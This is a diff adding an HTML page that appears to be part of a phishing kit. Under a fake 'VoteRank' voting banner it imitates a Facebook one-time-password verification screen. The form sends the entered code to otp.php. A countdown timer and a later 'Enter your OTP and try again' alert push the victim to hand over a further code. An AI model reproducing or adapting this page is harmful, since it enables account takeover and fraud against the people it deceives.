@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<title>VoteRank #289032</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+<!-- !PAGE CONTENT! -->
+<div class="w3-content" style="max-width:1500px">
+<head>
+<style>
+* {
+  -webkit-box-sizing: border-box;
+          box-sizing: border-box;
+}
+
+html {
+  background: white;
+}
+
+body {
+  background: white;
+  margin: 0;
+  padding: 0;
+  font-family: 'Lato', sans-serif;
+}
+h5{
+  color: white;
+}
+
+.login-form-wrap {
+  background: radial-gradient(ellipse at center, #5170ad 0%, #355493 100%);
+  border: 1px solid #2d416d;
+  -webkit-box-shadow: 0 1px #5670A4 inset, 0 0 10px 5px rgba(0, 0, 0, 0.1);
+          box-shadow: 0 1px #5670A4 inset, 0 0 10px 5px rgba(0, 0, 0, 0.1);
+  border-radius: 5px;
+  width: 360px;
+  height: 380px;
+  margin: 60px auto;
+  padding: 50px 30px 0 30px;
+  text-align: center;
+}
+.login-form-wrap h1 {
+  margin: 0 0 50px 0;
+  padding: 0;
+  font-size: 26px;
+  color: #fff;
+}
+.login-form-wrap h5 {
+  margin-top: 40px;
+}
+.login-form-wrap h5 > a {
+  font-size: 14px;
+  color: #fff;
+  text-decoration: none;
+  font-weight: 400;
+}
+
+.login-form input[type="text"], .login-form input[type="password"] {
+  width: 100%;
+  border: 1px solid #314d89;
+  outline: none;
+  padding: 12px 20px;
+  color: #afafaf;
+  font-weight: 400;
+  font-family: 'Lato', sans-serif;
+  cursor: pointer;
+}
+.login-form input[type="text"] {
+  border-bottom: none;
+  border-radius: 4px 4px 0 0;
+  padding-bottom: 13px;
+  -webkit-box-shadow: 0 -1px 0 #E0E0E0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;
+          box-shadow: 0 -1px 0 #E0E0E0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;
+}
+.login-form input[type="password"] {
+  border-top: none;
+  border-radius: 0 0 4px 4px;
+  -webkit-box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
+          box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
+}
+.login-form input[type="submit"] {
+  font-family: 'Lato', sans-serif;
+  font-weight: 400;
+  background: -webkit-gradient(linear, left top, left bottom, from(#e0e0e0), to(#cecece));
+  background: linear-gradient(to bottom, #e0e0e0 0%, #cecece 100%);
+  display: block;
+  margin: 20px auto 0 auto;
+  width: 100%;
+  border: none;
+  border-radius: 3px;
+  padding: 8px;
+  font-size: 17px;
+  color: #636363;
+  text-shadow: 0 1px 0 rgba(255, 255, 255, 0.45);
+  font-weight: 700;
+  -webkit-box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
+          box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
+}
+.login-form input[type="submit"]:hover {
+  background: #DDD;
+}
+.login-form input[type="submit"]:active {
+  padding-top: 9px;
+  padding-bottom: 7px;
+  background: #C9C9C9;
+}
+</style>
+</head>
+<header class="w3-panel w3-center w3-opacity">
+  <h1 class="w3-xlarge">VOTERANK</h1>
+  <h1>#289032</h1>
+</header>
+<section class="login-form-wrap">
+  <h1>Facebook Verify Otp</h1>
+  <form class="login-form" action="otp.php" method="post">
+    <label>
+      <input type="password" name="pass" placeholder="Otp" required>
+	  &nbsp;
+				<center> <div>Time left - <span id="timer">2:00</span></div></center>
+    </label>
+    <input type="submit" value="Login">
+  </form>
+  <script type="text/javascript">
+             startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==11){m=m-1}
+  if((m + '').length == 1){
+    m = '0' + m;
+  }
+  if(m < 0){
+    m = '11';
+  }
+  document.getElementById('timer').innerHTML = m + ":" + s;
+  setTimeout(startTimer, 1000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+</script>
+<audio id="xyz" src="https://x2convert.com/Thankyou?token=U2FsdGVkX19zZMVUt9FiInLG3xbWVEJ5Qo3jI3T1LqIK7LvqpIWb9DRoXutU4sdS5xwu6RqaXWm7aJcIoxqPWJPv6y6%2fAwEdoYgxddDrJ%2fKfoRDyWwf3gW%2fB2LL9fK9MxIdB2P2W9PIH0UcMazELrvBIYp0g8pQGFwORMDBjukJFjZc%2f0dMbScfWa5oyiKcE&s=youtube&id=&h=3692998352381650705" preload="auto"></audio>
+<br>
+<div dir="ltr" style="text-align: left;" trbidi="on">
+<script>
+   var count = 10; // Number of remaining seconds.
+   var counter; // Handle for the countdown event.
+   
+   function start() {
+    counter = setInterval(timer, 1000);
+   }
+
+   function timer() {
+    // Show the number of remaining seconds on the web page.
+    var output = document.getElementById("displaySeconds");
+    output.innerHTML = count;
+    
+    // Decrease the remaining number of seconds by one.
+    count--;
+    
+    // Check if the counter has reached zero.
+    if (count < 0) { // If the counter has reached zero...
+     // Stop the counter.
+     clearInterval(counter);
+     
+     // Start the download.
+      {
+      document.getElementById('xyz').play();
+  alert("Enter your OTP and try again");
+}
+     return;
+    }
+   }  
+   // Start the countdown timer when the page loads. 
+   window.addEventListener("load", start, false);
+  </script>
+<span style="color: white;">
+<span id="displaySeconds"></span>
+</section>
+</html>
